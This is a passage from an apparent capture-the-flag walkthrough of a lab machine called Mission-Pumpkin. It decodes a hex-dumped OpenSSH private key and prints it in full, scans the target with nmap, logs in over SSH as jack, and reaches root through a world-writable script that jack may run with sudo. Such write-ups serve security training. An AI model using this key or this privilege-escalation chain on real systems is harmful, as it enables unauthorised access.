4f 42 47 30 46 47 0a 6e 32 41 39 7a 31 45 6d 43 4e 48 49 36 33 4e 37 67 47 75 6c 34 4d 48 78 59 6d 36 39 59 64 6e 51 74 61 68 2f 43 65 4f 68 2f 65 4f 51 31 76 67 61 47 4e 55 55 31 30 35 32 2b 34 38 30 2b 4b 48 51 79 32 7a 37 6b 4b 0a 4d 67 45 2f 71 4d 34 55 37 69 35 6e 66 65 67 46 65 6d 31 78 45 34 32 69 34 45 79 74 52 59 32 61 67 2b 67 67 61 34 77 5a 66 65 2f 39 38 77 6f 65 42 38 4f 6c 4b 76 2b 70 42 6d 4e 67 48 41 42 31 6f 72 54 50 4c 62 0a 4b 68 37 69 7a 4c 6c 5a 4d 36 6b 51 30 41 53 53 66 44 66 30 52 62 5a 70 52 49 49 55 31 6e 67 52 58 52 6e 39 34 69 5a 76 6e 2f 38 66 77 56 32 69 43 4a 35 57 78 71 41 4c 74 5a 53 45 4a 6e 61 56 63 45 71 6c 6b 47 0a 31 6a 36 58 72 66 6b 65 55 55 72 59 57 6c 4f 6f 72 78 62 69 79 78 4d 47 65 43 31 39 56 76 65 50 50 70 58 76 47 4b 44 38 74 53 5a 31 4e 54 6e 48 33 52 6b 6b 51 47 4b 5a 6a 6f 68 51 73 64 36 37 49 53 34 66 75 70 0a 31 36 6b 34 6c 39 53 55 74 63 72 4a 41 41 41 41 43 58 4a 76 62 33 52 41 61 32 46 73 61 51 45 3d 0a 2d 2d 2d 2d 2d 45 4e 44 20 4f 50 45 4e 53 53 48 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0asetrus@host:~$ xxd -r -p jack 
-----BEGIN OPENSSH PRIVATE KEY-----
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
16k4l9SUtcrJAAAACXJvb3RAa2FsaQE=
-----END OPENSSH PRIVATE KEY-----

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

We could use this file to connect to ssh.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nmap -p- 192.168.56.104 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 00:36 EDT
Nmap scan report for pumpkins.local (192.168.56.104)
Host is up (0.000055s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
6880/tcp open  unknown
MAC Address: 08:00:27:FA:92:8E (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
root@setrus:~# telnet 192.168.56.104 6880
Trying 192.168.56.104...
Connected to 192.168.56.104.
Escape character is '^]'.
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
quit
Protocol mismatch.
Connection closed by foreign host.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Connecting as jack

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
setrus@host:~$ chmod 600 jack.key 
setrus@host:~$ ssh -i jack.key jack@192.168.56.104 -p 6880
------------------------------------------------------------------------------
                          Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------

Last login: Tue Jul 16 08:12:07 2019 from 192.168.1.105
-bash: /home/jack/.bash_profile: Permission denied
jack@pumpkin:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)

jack@pumpkin:~/pumpkins$ sudo -l
Matching Defaults entries for jack on pumpkin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on pumpkin:
    (ALL) /home/jack/pumpkins/alohomora*
jack@pumpkin:~/pumpkins$ ls -al
total 12
drwxrwxr-x 2 jack jack 4096 Oct 20 10:15 .
drwx------ 5 jack jack 4096 Oct 20 10:14 ..
-rwxrwxrwx 1 jack jack    8 Oct 20 10:15 alohomora
jack@pumpkin:~/pumpkins$ sudo ./alohomora
# id
uid=0(root) gid=0(root) groups=0(root)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



